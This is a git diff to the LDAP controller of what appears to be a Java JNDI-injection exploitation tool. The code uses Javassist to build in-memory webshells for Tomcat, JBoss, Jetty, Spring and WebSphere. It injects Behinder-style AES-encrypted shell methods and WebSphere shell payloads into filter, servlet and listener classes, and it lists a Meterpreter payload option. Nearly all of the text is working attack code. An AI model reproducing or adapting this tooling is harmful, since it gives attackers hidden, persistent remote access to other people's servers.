@@ -71,44 +71,60 @@ public class BasicController implements LdapController {
                 className = WeblogicEchoTemplate.class.getName();
                 break;
             case tomcatfilterjmx:
-                className = TFMSFromJMXF.class.getName();
-                ctClass = pool.get(className);
-                insertKeyMethod(ctClass,"bx");
+                className = "TFMSFromJMXF";
+                pool      = ClassPool.getDefault();
+                ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TFMSFromJMXF");
+                insertKeyMethod(ctClass, "bx");
+                ctClass.setName(className);
                 break;
             case tomcatfilterth:
-                className = TFMSFromThreadF.class.getName();
-                ctClass = pool.get(className);
-                insertKeyMethod(ctClass,"bx");
+                className = "TFMSFromThreadF";
+                pool      = ClassPool.getDefault();
+                ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TFMSFromThreadF");
+                insertKeyMethod(ctClass, "bx");
+                ctClass.setName(className);
                 break;
             case tomcatlistenerjmx:
-                className = TLMSFromJMXLi.class.getName();
-                ctClass = pool.get(className);
-                insertKeyMethod(ctClass,"bx");
+                className = "TLMSFromJMXLi";
+                pool      = ClassPool.getDefault();
+                ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TLMSFromJMXLi");
+                insertKeyMethod(ctClass, "bx");
+                ctClass.setName(className);
                 break;
             case tomcatlistenerth:
-                className = TLMSFromThreadLi.class.getName();
-                ctClass = pool.get(className);
-                insertKeyMethod(ctClass,"bx");
+                className = "TLMSFromThreadLi";
+                pool      = ClassPool.getDefault();
+                ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TLMSFromThreadLi");
+                insertKeyMethod(ctClass, "bx");
+                ctClass.setName(className);
                 break;
             case tomcatservletjmx:
-                className = TSMSFromJMXS.class.getName();
-                ctClass = pool.get(className);
-                insertKeyMethod(ctClass,"bx");
+                className = "TSMSFromJMXS";
+                pool      = ClassPool.getDefault();
+                ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TSMSFromJMXS");
+                insertKeyMethod(ctClass, "bx");
+                ctClass.setName(className);
                 break;
             case tomcatservletth:
-                className = TSMSFromThreadS.class.getName();
-                ctClass = pool.get(className);
-                insertKeyMethod(ctClass,"bx");
+                className = "TSMSFromThreadS";
+                pool      = ClassPool.getDefault();
+                ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TSMSFromThreadS");
+                insertKeyMethod(ctClass, "bx");
+                ctClass.setName(className);
                 break;
             case jbossfilter:
-                className = JBFMSFromContextF.class.getName();
-                ctClass = pool.get(className);
-                insertKeyMethod(ctClass,"bx");
+                className = "JBFMSFromContextF";
+                pool      = ClassPool.getDefault();
+                ctClass   = pool.get("com.nu1r.jndi.template.jboss.JBFMSFromContextF");
+                insertKeyMethod(ctClass, "bx");
+                ctClass.setName(className);
                 break;
             case jbossservlet:
-                className = JBSMSFromContextS.class.getName();
-                ctClass = pool.get(className);
-                insertKeyMethod(ctClass,"bx");
+                className = "JBSMSFromContextS";
+                pool      = ClassPool.getDefault();
+                ctClass   = pool.get("com.nu1r.jndi.template.jboss.JBSMSFromContextS");
+                insertKeyMethod(ctClass, "bx");
+                ctClass.setName(className);
                 break;
             case weblogicmemshell1:
                 className = WeblogicMemshellTemplate1.class.getName();
@@ -120,7 +136,9 @@ public class BasicController implements LdapController {
                 className = WebsphereMemshellTemplate.class.getName();
                 break;
             case springinterceptor:
-                className = SpringInterceptorMS.class.getName();
+                byte[] classBytes = new byte[0];
+                pool = ClassPool.getDefault();
+                ctClass = pool.get("com.nu1r.jndi.template.spring.SpringInterceptorMS");
                 String target = "com.nu1r.jndi.template.spring.SpringMemshellTemplate";
                 CtClass springTemplateClass = pool.get(target);
                 // 类名后加时间戳
@@ -134,24 +152,31 @@ public class BasicController implements LdapController {
                 String clazzNameContent = "clazzName=\"" + clazzName + "\";";
                 ctClass.makeClassInitializer().insertBefore(clazzNameContent);
                 ctClass.setName(SpringInterceptorMS.class.getName() + System.nanoTime());
+                className = ctClass.getName();
                 break;
             case issuccess:
                 className = isSuccess.class.getName();
                 break;
             case jettyfilter:
-                className = JFMSFromJMXF.class.getName();
-                ctClass = pool.get(className);
-                insertKeyMethod(ctClass,"bx");
+                className = "JFMSFromJMXF";
+                pool      = ClassPool.getDefault();
+                ctClass   = pool.get("com.nu1r.jndi.template.jetty.JFMSFromJMXF");
+                insertKeyMethod(ctClass, "bx");
+                ctClass.setName(className);
                 break;
             case jettyservlet:
-                className = JSMSFromJMXS.class.getName();
-                ctClass = pool.get(className);
-                insertKeyMethod(ctClass,"bx");
+                className = "JSMSFromJMXS";
+                pool      = ClassPool.getDefault();
+                ctClass   = pool.get("com.nu1r.jndi.template.jetty.JSMSFromJMXS");
+                insertKeyMethod(ctClass, "bx");
+                ctClass.setName(className);
                 break;
             case wsfilter:
-                className = WSFMSFromThread.class.getName();
-                ctClass = pool.get(className);
-                insertKeyMethod(ctClass,"ws");
+                className = "WSFMSFromThread";
+                pool      = ClassPool.getDefault();
+                ctClass   = pool.get("com.nu1r.jndi.template.Websphere.WSFMSFromThread");
+                insertKeyMethod(ctClass, "ws");
+                ctClass.setName(className);
                 break;
             case meterpreter:
                 className = Meterpreter.class.getName();
@@ -210,12 +235,19 @@ public class BasicController implements LdapController {
         }
     }
 
+
+    /**
+     * 测试内存马写入是否正确
+     * @param args
+     * @throws Exception
+     */
+    public static void main(String[] args) throws Exception {
+        ClassPool pool      = ClassPool.getDefault();
+        CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TSMSFromJMXS");
+        insertKeyMethod(ctClass,"bx");
+    }
+
     public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {
-
-        // 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
-        String name = ctClass.getName();
-        name = name.substring(name.lastIndexOf(".") + 1);
-
         // 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
         String method = "";
 
@@ -237,26 +269,23 @@ public class BasicController implements LdapController {
             }
         }
 
-
-
         switch (type) {
             // 冰蝎类型的内存马
             case "bx":
-                ctClass.addMethod(CtMethod.make(Utils.base64DecodeShell(BASE64_DECODE_STRING_TO_BYTE), ctClass));
-                ctClass.addMethod(CtMethod.make(Utils.base64DecodeShell(GET_FIELD_VALUE), ctClass));
+                ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
+                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
 
-                insertMethod(ctClass, method, Utils.base64DecodeShell(BEHINDER_AES));
+                insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_AES));
                 break;
             case "ws":
-                ctClass.addMethod(CtMethod.make(Utils.base64DecodeShell(TO_CSTRING_Method), ctClass));
-                ctClass.addMethod(CtMethod.make(Utils.base64DecodeShell(GET_METHOD_BY_CLASS), ctClass));
-                ctClass.addMethod(CtMethod.make(Utils.base64DecodeShell(GET_METHOD_AND_INVOKE), ctClass));
-                ctClass.addMethod(CtMethod.make(Utils.base64DecodeShell(GET_FIELD_VALUE), ctClass));
+                ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
+                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
+                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
+                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
 
-                insertMethod(ctClass, method, Utils.base64DecodeShell(WS_SHELL));
+                insertMethod(ctClass, method, Utils.base64Decode(WS_SHELL));
                 break;
         }
-
     }
 
     public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
